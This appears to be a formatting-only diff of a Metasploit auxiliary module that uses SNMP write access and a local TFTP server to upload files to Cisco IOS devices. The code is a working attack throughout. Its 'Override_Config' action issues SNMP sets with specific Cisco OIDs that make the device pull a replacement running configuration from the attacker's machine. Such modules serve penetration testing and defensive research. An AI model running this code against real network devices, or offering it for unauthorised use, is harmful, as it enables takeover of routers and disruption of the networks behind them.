@@ -10,7 +10,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'        => 'Cisco IOS SNMP File Upload (TFTP)',
+      'Name' => 'Cisco IOS SNMP File Upload (TFTP)',
       'Description' => %q{
           This module will copy file to a Cisco IOS device using SNMP and TFTP.
         The action Override_Config will override the running config of the Cisco device.
@@ -19,38 +19,36 @@ class MetasploitModule < Msf::Auxiliary
         be able to connect back to the Metasploit system and the use of
         NAT will cause the TFTP transfer to fail.
         },
-      'Author'      =>
+      'Author' => [
+        'pello <fropert[at]packetfault.org>',
+        'ct5595'
+      ],
+      'License' => MSF_LICENSE,
+      'Actions' => [
         [
-          'pello <fropert[at]packetfault.org>',
-          'ct5595'
+          'Upload_File',
+          {
+            'Description' => 'Upload the file',
+            'ciscoFlashCopyProtocol' => '1.3.6.1.4.1.9.9.10.1.2.1.1.3.',
+            'ciscoFlashCopyServerAddress' => '1.3.6.1.4.1.9.9.10.1.2.1.1.4.',
+            'ciscoFlashCopySourceName' => '1.3.6.1.4.1.9.9.10.1.2.1.1.5.',
+            'ciscoFlashCopyDestinationName' => '1.3.6.1.4.1.9.9.10.1.2.1.1.6.',
+          }
         ],
-      'License'     => MSF_LICENSE,
-      'Actions'     =>
         [
-          [
-            'Upload_File',
-            {
-              'Description'                   => 'Upload the file',
-              'ciscoFlashCopyProtocol'        => '1.3.6.1.4.1.9.9.10.1.2.1.1.3.',
-              'ciscoFlashCopyServerAddress'   => '1.3.6.1.4.1.9.9.10.1.2.1.1.4.',
-              'ciscoFlashCopySourceName'      => '1.3.6.1.4.1.9.9.10.1.2.1.1.5.',
-              'ciscoFlashCopyDestinationName' => '1.3.6.1.4.1.9.9.10.1.2.1.1.6.',
-            }
-          ],
-          [
-            'Override_Config',
-            {
-              'Description'                   => 'Override the running config',
-              'ccCopyProtocol'                => '1.3.6.1.4.1.9.9.96.1.1.1.1.2.',
-              'ccCopySourceFileType'          => '1.3.6.1.4.1.9.9.96.1.1.1.1.3.',
-              'ccCopyDestFileType'            => '1.3.6.1.4.1.9.9.96.1.1.1.1.4.',
-              'ccCopyServerAddress'           => '1.3.6.1.4.1.9.9.96.1.1.1.1.5.',
-              'ccCopyFileName'                => '1.3.6.1.4.1.9.9.96.1.1.1.1.6.',
-              'ccCopyEntryRowStatus'          => '1.3.6.1.4.1.9.9.96.1.1.1.1.14.'
-            }
-          ]
-        ],
-        'DefaultAction' => 'Upload_File'
+          'Override_Config',
+          {
+            'Description' => 'Override the running config',
+            'ccCopyProtocol' => '1.3.6.1.4.1.9.9.96.1.1.1.1.2.',
+            'ccCopySourceFileType' => '1.3.6.1.4.1.9.9.96.1.1.1.1.3.',
+            'ccCopyDestFileType' => '1.3.6.1.4.1.9.9.96.1.1.1.1.4.',
+            'ccCopyServerAddress' => '1.3.6.1.4.1.9.9.96.1.1.1.1.5.',
+            'ccCopyFileName' => '1.3.6.1.4.1.9.9.96.1.1.1.1.6.',
+            'ccCopyEntryRowStatus' => '1.3.6.1.4.1.9.9.96.1.1.1.1.14.'
+          }
+        ]
+      ],
+      'DefaultAction' => 'Upload_File'
     )
     register_options([
       OptPath.new('SOURCE', [true, "The filename to upload" ]),
@@ -62,9 +60,8 @@ class MetasploitModule < Msf::Auxiliary
   # Start the TFTP Server
   #
   def setup
-
-    @path     = datastore['SOURCE']
-    @filename = @path.split(/[\/\\]/)[-1] #/
+    @path = datastore['SOURCE']
+    @filename = @path.split(/[\/\\]/)[-1] # /
 
     # Setup is called only once
     print_status("Starting TFTP server...")
@@ -80,7 +77,6 @@ class MetasploitModule < Msf::Auxiliary
     add_socket(@tftp.sock)
 
     @main_thread = ::Thread.current
-
   end
 
   #
@@ -102,7 +98,6 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run_host(ip)
-
     begin
       lhost = datastore['LHOST'] || Rex::Socket.source_address(ip)
 
@@ -114,22 +109,21 @@ class MetasploitModule < Msf::Auxiliary
       ciscoFlashCopyEntryStatus = '1.3.6.1.4.1.9.9.10.1.2.1.1.11.'
       ciscoFlashCopyCommand = '1.3.6.1.4.1.9.9.10.1.2.1.1.2.'
 
-      varbind = SNMP::VarBind.new("#{ciscoFlashCopyEntryStatus}#{session}" , SNMP::Integer.new(6))
+      varbind = SNMP::VarBind.new("#{ciscoFlashCopyEntryStatus}#{session}", SNMP::Integer.new(6))
       value = snmp.set(varbind)
 
-      varbind = SNMP::VarBind.new("#{ciscoFlashCopyEntryStatus}#{session}" , SNMP::Integer.new(5))
+      varbind = SNMP::VarBind.new("#{ciscoFlashCopyEntryStatus}#{session}", SNMP::Integer.new(5))
       value = snmp.set(varbind)
 
-      varbind = SNMP::VarBind.new("#{ciscoFlashCopyCommand}#{session}" , SNMP::Integer.new(2))
+      varbind = SNMP::VarBind.new("#{ciscoFlashCopyCommand}#{session}", SNMP::Integer.new(2))
       value = snmp.set(varbind)
-
 
       # If the above line didn't throw an error, the host is alive and the community is valid
       print_status("Copying file #{@filename} to #{ip}...")
 
-      if(action.name == 'Upload_File')
+      if (action.name == 'Upload_File')
 
-        varbind = SNMP::VarBind.new("#{action.opts['ciscoFlashCopyProtocol']}#{session}" , SNMP::Integer.new(1))
+        varbind = SNMP::VarBind.new("#{action.opts['ciscoFlashCopyProtocol']}#{session}", SNMP::Integer.new(1))
         value = snmp.set(varbind)
 
         varbind = SNMP::VarBind.new("#{action.opts['ciscoFlashCopyServerAddress']}#{session}", SNMP::IpAddress.new(lhost))
@@ -141,18 +135,18 @@ class MetasploitModule < Msf::Auxiliary
         varbind = SNMP::VarBind.new("#{action.opts['ciscoFlashCopyDestinationName']}#{session}", SNMP::OctetString.new(@filename))
         value = snmp.set(varbind)
 
-        varbind = SNMP::VarBind.new("#{ciscoFlashCopyEntryStatus}#{session}" , SNMP::Integer.new(1))
+        varbind = SNMP::VarBind.new("#{ciscoFlashCopyEntryStatus}#{session}", SNMP::Integer.new(1))
         value = snmp.set(varbind)
 
-      elsif(action.name == 'Override_Config')
+      elsif (action.name == 'Override_Config')
 
-        varbind = SNMP::VarBind.new("#{action.opts['ccCopyProtocol']}#{session}" , SNMP::Integer.new(1))
+        varbind = SNMP::VarBind.new("#{action.opts['ccCopyProtocol']}#{session}", SNMP::Integer.new(1))
         value = snmp.set(varbind)
 
-        varbind = SNMP::VarBind.new("#{action.opts['ccCopySourceFileType']}#{session}" , SNMP::Integer.new(1))
+        varbind = SNMP::VarBind.new("#{action.opts['ccCopySourceFileType']}#{session}", SNMP::Integer.new(1))
         value = snmp.set(varbind)
 
-        varbind = SNMP::VarBind.new("#{action.opts['ccCopyDestFileType']}#{session}" , SNMP::Integer.new(4))
+        varbind = SNMP::VarBind.new("#{action.opts['ccCopyDestFileType']}#{session}", SNMP::Integer.new(4))
         value = snmp.set(varbind)
 
         varbind = SNMP::VarBind.new("#{action.opts['ccCopyServerAddress']}#{session}", SNMP::IpAddress.new(lhost))
@@ -161,10 +155,9 @@ class MetasploitModule < Msf::Auxiliary
         varbind = SNMP::VarBind.new("#{action.opts['ccCopyFileName']}#{session}", SNMP::OctetString.new(@filename))
         value = snmp.set(varbind)
 
-        varbind = SNMP::VarBind.new("#{action.opts['ccCopyEntryRowStatus']}#{session}" , SNMP::Integer.new(1))
+        varbind = SNMP::VarBind.new("#{action.opts['ccCopyEntryRowStatus']}#{session}", SNMP::Integer.new(1))
         value = snmp.set(varbind)
       end
-
 
     # No need to make noise about timeouts
     rescue ::Rex::ConnectionError, ::SNMP::RequestTimeout, ::SNMP::UnsupportedVersion
